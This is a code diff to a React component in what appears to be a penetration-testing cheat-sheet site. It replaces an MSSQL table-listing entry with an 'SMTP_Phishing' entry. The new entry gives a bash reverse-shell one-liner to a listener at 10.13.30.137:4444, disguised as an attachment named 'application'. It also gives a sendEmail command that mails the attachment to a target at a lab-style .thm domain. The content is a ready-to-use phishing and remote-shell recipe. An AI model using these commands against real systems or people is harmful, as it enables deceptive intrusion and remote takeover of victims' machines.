@@ -15,7 +15,7 @@ import ChevronRightIcon from '@mui/icons-material/ChevronRight';
     title: string;
   }
   
-  const MSSQL_List_Tables = ({ title }: IProps) => {
+  const SMTP_Phishing = ({ title }: IProps) => {
 
     return (
       <>
@@ -40,16 +40,24 @@ import ChevronRightIcon from '@mui/icons-material/ChevronRight';
               <Typography variant="h6">
                     Description
                 </Typography>
-
-
               <Typography>
-              To list tables in MSSQL.
+              We can send the target a malicious email and get a reverse shell back when they open it.
                </Typography>
-               <Box pt={5} />
-              <SyntaxHighlighter className="syntax" language="ftp">
-              {"select table_name from {DB_NAME}.INFORMATION_SCHEMA.TABLES;"}
+               <Box pt={5}/>
+               <Typography>
+               Reverse Shell as a Linux Application
+               </Typography>
+              <SyntaxHighlighter className="syntax" language="bash">
+              {"echo 'bash -c \"bash -i >& /dev/tcp/10.13.30.137/4444 0>&1\"' > application"}
             </SyntaxHighlighter>
-            
+            <Box pt={5}/>
+               <Typography>
+               CLI: sendEmail
+               </Typography>
+              <SyntaxHighlighter className="syntax" language="bash">
+              {"sendEmail -f shelled@test.com -t hakanbey@uranium.thm -a ./application -m \"Hi\" -s 10.10.23.23 -o tls=no"}
+            </SyntaxHighlighter>
+            <Box pt={2}/>
             </Typography>
           </AccordionDetails>
         </Accordion>
@@ -58,5 +66,5 @@ import ChevronRightIcon from '@mui/icons-material/ChevronRight';
   };
 
   
-  export default MSSQL_List_Tables;
+  export default SMTP_Phishing;
   
